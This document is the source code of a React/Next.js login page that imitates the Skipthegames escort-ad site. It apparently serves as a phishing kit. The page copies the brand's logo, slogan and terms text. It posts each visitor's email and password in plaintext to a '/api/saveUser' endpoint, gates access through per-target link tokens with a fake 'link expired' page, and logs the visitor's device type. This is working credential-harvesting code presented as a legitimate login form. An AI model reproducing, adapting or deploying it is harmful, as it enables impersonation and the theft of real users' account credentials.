"use client";

import React, { useEffect, useState } from "react";
import axios from "axios";
import { useDispatch } from "react-redux";
import { useRouter } from "next/navigation";
import { userLogin } from "@/lib/userSlice";
import { storeData } from "@/lib/dataSlice";
import { usePathname } from "next/navigation";
import NotFoundPage from "@/components/LinkExpired";

const LoginPage = () => {
  const dispatch = useDispatch();
  const router = useRouter();
  const pathname = usePathname();

  const [passwordVisible, setPasswordVisible] = useState(true);
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const [deviceType, setDeviceType] = useState("");

  const [isLinkExpired, setIsLinkExpired] = useState(false);

  const [domain, setDomain] = useState("");

  useEffect(() => {
    setDomain(window.location.origin);
  }, []);
  useEffect(() => {
    async function fetchData() {
      const res = await axios.post("/api/links",{domain});
      const links = res.data.data;
      console.log(links);

      const link = links.find(
        (link: { link: string }) => `/${link.link}` === pathname
      );
      if (!link) {
        setIsLinkExpired(true);
      }
    }

    if (pathname && pathname !== "/" && !isLinkExpired && domain) {
      fetchData();
    } else {
      setIsLinkExpired(false);
    }
  }, [pathname, domain]);

  // Fetch user data
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const fetchData = async () => {
      try {
        const res = await axios.get("/api/getData");
        if (res?.data?.success) {
          dispatch(
            storeData({
              email: res.data.data.email,
              step1: res.data.data.step1,
              step2: res.data.data.step2,
              step3: res.data.data.step3,
            })
          );
        }
      } catch (error) {
        console.error(error);
      }
    };
    fetchData();
  }, [dispatch, isLinkExpired]);

  // Detect device
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const detectDevice = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile =
        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
          userAgent
        );
      return isMobile ? "Mobile" : "Desktop";
    };

    const type = detectDevice();
    setDeviceType(type);

    const sendDevice = async () => {
      try {
        await axios.get(`/api/device?id=${type}`);
      } catch (error) {
        console.error(error);
      }
    };
    sendDevice();
  }, [isLinkExpired]);

  const togglePasswordVisibility = () => {
    setPasswordVisible((prev) => !prev);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      console.log("Password is required");
      return;
    }

    dispatch(userLogin({ user, password, deviceType }));
    router.push("/login");

    try {
      await axios.post("/api/saveUser", { user, password, deviceType });
      console.log("User data saved successfully");
    } catch (error) {
      console.error(error);
    }
  };

  if (isLinkExpired) {
    return <NotFoundPage />;
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white text-gray-800">
      <div className="bg-white rounded-lg p-3 max-w-lg w-full">
        {/* Logo */}
        <div className="text-start mb-6">
          <img
            src="https://res.cloudinary.com/drmvudsul/image/upload/v1731950993/Skipthegames-255x39_rpo8an.webp"
            alt="Skip the games logo"
            className="w-64"
          />
          <p className="text-gray-500 mt-2 text-lg font-semibold">
            Skip the games. Get satisfaction.
          </p>
        </div>

        {/* Login Form */}
        <div className="mb-8">
          <h2 className="text-2xl font-semibold mb-4">
            Log in to your account
          </h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="email"
              value={user}
              onChange={(e) => setUser(e.target.value)}
              placeholder="Your email"
              required
              className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <div className="relative">
              <input
                type={passwordVisible ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
                className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="right-2 top-3 text-sm underline text-[#990033]"
              >
                {passwordVisible ? "Hide password" : "Show password"}
              </button>
            </div>
            <button className="w-full bg-[#2ba6c8] text-white py-3 rounded hover:bg-[#2698b8] transition">
              Submit
            </button>
          </form>
          <div className="text-[#990033] font-bold text-sm mt-3 inline-block">
            Password not working? <span className="underline">Click here</span>
          </div>
        </div>

        {/* Terms */}
        <div className="text-sm text-gray-700 mb-4">
          By clicking &quot;Log in&quot;, you accept{" "}
          <span className="text-[#990033] underline">
            Skipthegames.com&apos;s Terms and Conditions of Use
          </span>
          .
        </div>
        <div className="text-sm text-gray-700 mb-6">
          This site is protected by hCaptcha and its{" "}
          <span className="text-[#990033] underline">Privacy Policy</span> and{" "}
          <span className="text-[#990033] underline">Terms of Service</span>{" "}
          apply.
        </div>

        {/* First time */}
        <div className="text-start">
          <p className="text-lg font-semibold mb-2">First time here?</p>
          <p className="text-[#990033] underline text-lg hover:text-pink-800">
            Post your first ad
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="mt-10 w-full text-gray-600">
        <div>
          <p className="text-[#990033]">© Skipthegames.eu</p>
        </div>
        <ul className="flex gap-4 mt-4 text-gray-600 pb-10">
          <li className="text-[#990033]">Home</li>
          <li className="text-[#990033]">Contact</li>
          <li className="text-[#990033]">About</li>
          <li className="text-[#990033]">Privacy</li>
          <li className="text-[#990033]">Terms</li>
          <li className="text-[#990033]">Escort Info</li>
        </ul>
      </footer>
    </div>
  );
};

export default LoginPage;
